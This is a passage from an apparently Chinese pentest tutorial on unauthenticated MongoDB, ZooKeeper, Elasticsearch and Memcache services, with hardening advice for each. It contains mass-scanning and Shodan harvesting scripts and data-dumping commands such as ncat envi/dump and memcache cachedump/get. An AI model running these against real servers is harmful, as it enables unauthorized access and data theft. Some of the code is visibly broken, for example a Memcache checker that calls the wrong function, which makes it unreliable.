端口</li><li>数据库隐私泄露</li><li>数据库被清空</li><li>数据库运行缓慢</li></ul><h4 id="1-扫描探测-2"><a href="#1-扫描探测-2" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p>下载：<a href="http://nmap.org/svn/scripts/mongodb-info.nse" target="_blank" rel="noopener">http://nmap.org/svn/scripts/mongodb-info.nse</a><br><code>nmap -p 27017 --script mongodb-info</code><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b45b6a28-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b45b6a28-5195-1.png" alt="img"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mongodb.conf</span><br><span class="line">dbpath = /data/</span><br><span class="line">logpath = /var/logs/mongodb.log</span><br><span class="line">##port = 27017</span><br><span class="line">##fork = true</span><br><span class="line">bind_ip = 0.0.0.0</span><br><span class="line"></span><br><span class="line">./mongod –config mongodb.conf //启动mongodb加载配置mongodb.conf</span><br></pre></td></tr></table></figure><p><strong>1.1 基础</strong><br><a href="https://www.jianshu.com/p/8bf26effa737" target="_blank" rel="noopener">https://www.jianshu.com/p/8bf26effa737</a><br><a href="http://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/mongodb/mongodb-tutorial.html</a><br><a href="https://itbilu.com/database/mongo/E1tWQz4_e.html" target="_blank" rel="noopener">https://itbilu.com/database/mongo/E1tWQz4_e.html</a></p><p><strong>1.2 批量扫描未授权</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import pymongo</span><br><span class="line"></span><br><span class="line">ipcons = []</span><br><span class="line">def Scanner(ip):</span><br><span class="line">    global ipcons</span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sk.settimeout(0.3)</span><br><span class="line">    try:</span><br><span class="line">        sk.connect((ip,27017))</span><br><span class="line">        ipcons.append(ip)</span><br><span class="line">        sk.close()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def ip2num(ip):</span><br><span class="line">    ip=[int(x) for x in ip.split(&apos;.&apos;)]</span><br><span class="line">    return ip[0] &lt;&lt;24 | ip[1]&lt;&lt;16 | ip[2]&lt;&lt;8 |ip[3]</span><br><span class="line"></span><br><span class="line">def num2ip(num):</span><br><span class="line">    return &apos;%s.%s.%s.%s&apos; %( (num &amp; 0xff000000) &gt;&gt;24,</span><br><span class="line">                                (num &amp; 0x00ff0000) &gt;&gt;16,</span><br><span class="line">                                (num &amp; 0x0000ff00) &gt;&gt;8,</span><br><span class="line">                                num &amp; 0x000000ff )</span><br><span class="line"></span><br><span class="line">def get_ip(ip):</span><br><span class="line">    start,end = [ip2num(x) for x in ip.split(&apos; &apos;) ]</span><br><span class="line">    return [ num2ip(num) for num in range(start,end+1) if num &amp; 0xff ]</span><br><span class="line"></span><br><span class="line">startIp = sys.argv[1]</span><br><span class="line">endIp = sys.argv[2]</span><br><span class="line">iplist = get_ip(sys.argv[1]+&quot; &quot;+sys.argv[2])</span><br><span class="line">for i in iplist:</span><br><span class="line">    Scanner(i)</span><br><span class="line"></span><br><span class="line">def connMon(ip_addr):</span><br><span class="line">    print &apos; Connect mongodb: &apos; + ip_addr + &apos;:27017&apos;</span><br><span class="line">    try:</span><br><span class="line">        conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000)</span><br><span class="line">        dbname = conn.database_names()</span><br><span class="line">        print &quot;success&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">print ipcons   </span><br><span class="line">for ipaddr in ipcons:</span><br><span class="line">    connMon(ipaddr)</span><br><span class="line">    print &quot;=================&quot;</span><br></pre></td></tr></table></figure><p><strong>1.3 shodan扫描脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/python</span><br><span class="line">## -*- coding: UTF-8 -*-</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">@Author：joy_nick</span><br><span class="line">@博客：http://byd.dropsec.xyz/</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import shodan</span><br><span class="line">import os</span><br><span class="line">iplist = []</span><br><span class="line">ip_list = []</span><br><span class="line">shodan_ip_list = []</span><br><span class="line">def shodanSearch(keywords):</span><br><span class="line">    SHODAN_API_KEY = &quot;your key&quot;</span><br><span class="line">    api = shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    total = 0</span><br><span class="line">    try:</span><br><span class="line">        results = api.search(keywords)</span><br><span class="line">        total = int(results[&apos;total&apos;])</span><br><span class="line">        for result in results[&apos;matches&apos;]:</span><br><span class="line">            ##iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;)</span><br><span class="line">            iplist.append(result[&apos;ip_str&apos;])</span><br><span class="line">            for i in range(len(iplist)):</span><br><span class="line">                ip_list = iplist[i].encode(&apos;utf-8&apos;)</span><br><span class="line">                shodan_ip_list.append(ip_list)</span><br><span class="line">                s = &apos;\n&apos;.join(shodan_ip_list)</span><br><span class="line">                with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output:</span><br><span class="line">                    output.write(s)</span><br><span class="line">    except shodan.APIError, e:</span><br><span class="line">        print &apos;Error: %s&apos; % e</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    shodanSearch(&apos;redis&apos;)</span><br></pre></td></tr></table></figure><p>查询操作<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b4857480-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b4857480-5195-1.png" alt="img"></a></p><h4 id="2-爆破脚本"><a href="#2-爆破脚本" class="headerlink" title="2. 爆破脚本"></a><strong>2. 爆破脚本</strong></h4><p><a href="https://github.com/netxfly/x-crack" target="_blank" rel="noopener">https://github.com/netxfly/x-crack</a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b4b2bd00-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092645-b4b2bd00-5195-1.png" alt="img"></a></p><h4 id="3-攻击脚本"><a href="#3-攻击脚本" class="headerlink" title="3. 攻击脚本"></a><strong>3. 攻击脚本</strong></h4><p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a></p><h4 id="4-防范措施"><a href="#4-防范措施" class="headerlink" title="4. 防范措施"></a><strong>4. 防范措施</strong></h4><p><strong>(1).新建管理账户开启MongoDB授权</strong><br>新建终端[参数默认可以不加，若有自定义参数，才要加上，下同]<br><code>mongod --port 27017 --dbpath /data/db1</code></p><p>另起一个终端，运行下列命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27017</span><br><span class="line"></span><br><span class="line">  use admin</span><br><span class="line"></span><br><span class="line">  db.createUser(</span><br><span class="line">    &#123;</span><br><span class="line">      user: &quot;adminUser&quot;,</span><br><span class="line">      pwd: &quot;adminPass&quot;,</span><br><span class="line">      roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092646-b55e1448-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092646-b55e1448-5195-1.png" alt="img"></a></p><p><strong>(2).本地访问</strong><br>bind 127.0.0.1</p><p><strong>(3).修改默认端口</strong><br>修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</p><p><strong>(4).禁用HTTP和REST端口</strong><br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false<br><strong>(5).开启日志审计功能</strong><br>审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情<br><strong>(6).开启auth认证</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/mongodb.conf　　</span><br><span class="line">auth = true</span><br></pre></td></tr></table></figure><p>其他:<a href="http://www.mottoin.com/105609.html" target="_blank" rel="noopener">http://www.mottoin.com/105609.html</a></p><h2 id="0x04-ZooKeeper未授权访问"><a href="#0x04-ZooKeeper未授权访问" class="headerlink" title="0x04 ZooKeeper未授权访问"></a>0x04 ZooKeeper未授权访问</h2><p>From: <a href="http://www.polaris-lab.com/index.php/archives/41/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/41/</a><br><a href="http://www.majunwei.com/category/201612011952003333/" target="_blank" rel="noopener">http://www.majunwei.com/category/201612011952003333/</a><br><a href="http://www.mottoin.com/92742.html" target="_blank" rel="noopener">http://www.mottoin.com/92742.html</a><br><a href="http://cve.scap.org.cn/CVE-2014-0085.html" target="_blank" rel="noopener">http://cve.scap.org.cn/CVE-2014-0085.html</a><br><a href="http://ifeve.com/zookeeper_guidetozkoperations/" target="_blank" rel="noopener">http://ifeve.com/zookeeper_guidetozkoperations/</a><br><a href="http://blog.csdn.net/u011721501/article/details/44062617" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/44062617</a></p><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p><h4 id="1-扫描探测-3"><a href="#1-扫描探测-3" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br><code>./zkCli.sh -server 127.0.0.1 2181</code></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092648-b66c363a-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092648-b66c363a-5195-1.png" alt="img"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24  </span><br><span class="line">grep &quot;Ports: 2181/open/tcp&quot; zookeeper.gnmap | cut -f 2 -d &apos; &apos; &gt; Live.txt</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092649-b719f68a-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092649-b719f68a-5195-1.png" alt="img"></a></p><h4 id="2-攻击获取信息"><a href="#2-攻击获取信息" class="headerlink" title="2.攻击获取信息"></a><strong>2.攻击获取信息</strong></h4><ul><li>stat：列出关于性能和连接的客户端的统计信息。<br>echo stat |ncat 127.0.0.1 2181</li><li>ruok：测试服务器是否运行在非错误状态。<br>echo ruok |ncat 127.0.0.1 2181</li><li>reqs：列出未完成的请求。<br>echo reqs |ncat 127.0.0.1 2181</li><li>envi：打印有关服务环境的详细信息。<br>echo envi |ncat 127.0.0.1 2181</li></ul><p>dump：列出未完成的会话和临时节点。<br>echo dump |ncat 127.0.0.1 2181</p><h4 id="3-防范措施"><a href="#3-防范措施" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><ul><li>禁止把Zookeeper直接暴露在公网</li><li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</li></ul><h2 id="0x05-Elasticsearch未授权访问"><a href="#0x05-Elasticsearch未授权访问" class="headerlink" title="0x05 Elasticsearch未授权访问"></a>0x05 Elasticsearch未授权访问</h2><p>ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。</p><h4 id="1-熟悉的响应-You-Know-for-Search"><a href="#1-熟悉的响应-You-Know-for-Search" class="headerlink" title="1.熟悉的响应 You Know, for Search"></a><strong>1.熟悉的响应</strong> You Know, for Search</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:9200/_cat/indices/</span><br><span class="line"></span><br><span class="line">&#123; &quot;status&quot; : 200, &quot;name&quot; : &quot;Flake&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;version&quot; : &#123;&quot;number&quot; : &quot;1.4.1&quot;,&quot; &quot;build_hash&quot; : &quot;b88f43fc40b0bcd7f173xxxxx2e97816de80b19&quot;, &quot;build_timestamp&quot; : &quot;2015-07-29T09:54:16Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;4.10.4&quot;&#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a><strong>2.漏洞测试</strong></h4><p>安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br><code>http://localhost:9200/_cat/indices</code> 里面的indices包含了_river一般就是安装了river了。</p><p><a href="http://localhost:9200/_plugin/head/" target="_blank" rel="noopener">http://localhost:9200/_plugin/head/</a> web管理界面<br><a href="http://localhost:9200/_cat/indices" target="_blank" rel="noopener">http://localhost:9200/_cat/indices</a><br><a href="http://localhost:9200/_river/_search" target="_blank" rel="noopener">http://localhost:9200/_river/_search</a> 查看数据库敏感信息<br><a href="http://localhost:9200/_nodes" target="_blank" rel="noopener">http://localhost:9200/_nodes</a> 查看节点数据</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092651-b81e6462-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092651-b81e6462-5195-1.png" alt="img"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092652-b8a041bc-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092652-b8a041bc-5195-1.png" alt="img"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##! /usr/bin/env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def Elasticsearch_check(ip, port=9200, timeout=5):</span><br><span class="line">    try:</span><br><span class="line">    　　url = &quot;http://&quot;+ip+&quot;:&quot;+str(port)+&quot;/_cat&quot;</span><br><span class="line">    　　response = requests.get(url) </span><br><span class="line">    except:</span><br><span class="line">    　　pass</span><br><span class="line">    if &quot;/_cat/master&quot; in response.content:</span><br><span class="line">    　　print &apos;[+] Elasticsearch Unauthorized: &apos; +ip+&apos;:&apos;+str(port)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure><p><a href="https://www.secpulse.com/archives/46394.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/46394.html</a></p><h4 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a><strong>3.漏洞修复</strong></h4><p>(1)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 9200 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 9200 -j DROP</span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure><p>(2)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。<br><a href="https://www.jianshu.com/p/7ec26c13abbb" target="_blank" rel="noopener">https://www.jianshu.com/p/7ec26c13abbb</a><br><a href="https://www.sojson.com/blog/213.html" target="_blank" rel="noopener">https://www.sojson.com/blog/213.html</a><br>(3)、限制IP访问，绑定固定IP<br>(4)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.basic.enabled     true     ##开关，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user     &quot;admin&quot;     ##账号</span><br><span class="line">http.basic.password     &quot;admin_pw&quot;     ##密码</span><br><span class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]     ##白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</span><br><span class="line">http.basic.trusted_proxy_chains     []     ##信任代理列表</span><br><span class="line">http.basic.log     false     ##把无授权的访问事件添加到ES的日志</span><br><span class="line">http.basic.xforward     &quot;&quot;     ##记载代理路径的header字段名</span><br></pre></td></tr></table></figure><p><a href="https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf" target="_blank" rel="noopener">https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf</a><br><a href="https://blog.csdn.net/u011419453/article/details/39395627" target="_blank" rel="noopener">https://blog.csdn.net/u011419453/article/details/39395627</a></p><h2 id="0x06-Memcache未授权访问"><a href="#0x06-Memcache未授权访问" class="headerlink" title="0x06 Memcache未授权访问"></a>0x06 Memcache未授权访问</h2><p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p><h4 id="1-扫描探测-4"><a href="#1-扫描探测-4" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092653-b9094a68-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092653-b9094a68-5195-1.png" alt="img"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##! /usr/bin/env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line">def Memcache_check(ip, port=11211, timeout=5):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;stats\r\n&quot;)</span><br><span class="line">        result = s.recv(1024)</span><br><span class="line">        if &quot;STAT version&quot; in result:</span><br><span class="line">            print &apos;[+] Memcache Unauthorized: &apos; +ip+&apos;:&apos;+str(port)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure><h4 id="2-攻击利用-1"><a href="#2-攻击利用-1" class="headerlink" title="2.攻击利用"></a><strong>2.攻击利用</strong></h4><p><strong>2.1 基础部分</strong></p><p>通过一个<code>cheat sheet</code>了解一下Memcached的协议。Memcached的语法由如下元素组成</p><ul><li>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</li></ul><p>command字段有如下几条命令</p><ul><li>存储操作(set, add, replace, append, prepend, cas)</li><li>检索操作 (get, gets)</li><li>删除操作 (delete)</li><li>增减操作 (incr, decr)</li><li>touch</li><li>slabs reassign</li><li>slabs automove</li><li>lru_crawler</li><li>统计操作(stats items, slabs, cachedump)</li><li>其他操作 (version, flush_all, quit)</li></ul><hr><table><thead><tr><th>Command</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>get</td><td>读某个值</td><td>get mykey</td></tr><tr><td>set</td><td>强制设置某个键值</td><td>set mykey 0 60 5</td></tr><tr><td>add</td><td>添加新键值对</td><td>add newkey 0 60 5</td></tr><tr><td>replace</td><td>覆盖已经存在的key</td><td>replace key 0 60 5</td></tr><tr><td>flush_all</td><td>让所有条目失效</td><td>flush_all</td></tr><tr><td>stats</td><td>打印当前状态</td><td>stats</td></tr><tr><td>stats malloc</td><td>打印内存状态</td><td>stats malloc</td></tr><tr><td>version</td><td>打印Memcached版本</td><td>version</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats  //查看memcache 服务状态</span><br><span class="line">stats items  //查看所有items</span><br><span class="line">stats cachedump 32 0  //获得缓存key</span><br><span class="line">get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><p><strong>2.2 建立连接并获取信息</strong><br><code>telnet  11211</code>，或<code>nc -vv  11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092653-b9664128-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092653-b9664128-5195-1.png" alt="img"></a></p><p>附赠大佬写的文章 <a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">Discuz!因Memcached未授权访问导致的RCE</a></p><hr><h4 id="3-防范措施-1"><a href="#3-防范措施-1" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><p><em>1.限制访问</em><br>如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：<br><code>memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p><p>或者 vim /etc/sysconfig/memcached，修改配置文件<br><em><code>OPTIONS=&quot;-l 127.0.0.1&quot;</code></em>，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload</p><p><em>2.防火墙</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 11211 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 11211 -j DROP</span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure><p><em>3.使用最小化权限账号运行Memcached服务</em><br>使用普通权限账号运行，指定Memcached用户。<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p><p><em>4.启用认证功能</em><br>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX##saslauthd" target="_blank" rel="noopener">SASL认证详细配置手册</a></p><p><em>5.修改默认端口</em><br>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></p><p><em>6.定期升级</em></p><p>参考:<br><a href="http://lzone.de/cheat-sheet/memcached" target="_blank" rel="noopener">http://lzone.de/cheat-sheet/memcached</a><br><a href="https://www.secpulse.com/archives/49659.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49659.html</a><br><a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/" target="_blank" rel="noopener">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a><br><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a><br><a href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/" target="_blank" rel="noopener">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a><br><a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">https://xz.aliyun.com/t/2018</a><br><a href="http://drops.xmd5.com/static/drops/web-8987.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-8987.html</a><br><a href="https://blog.csdn.net/microzone/article/details/79262549" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/79262549</a></p><h2 id="0x07-Hadoop未授权访问"><a href="#0x07-Hadoop未授权访问" class="headerlink" title="0x07 Hadoop未授权访问"></a>0x07 Hadoop未授权访问</h2><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last 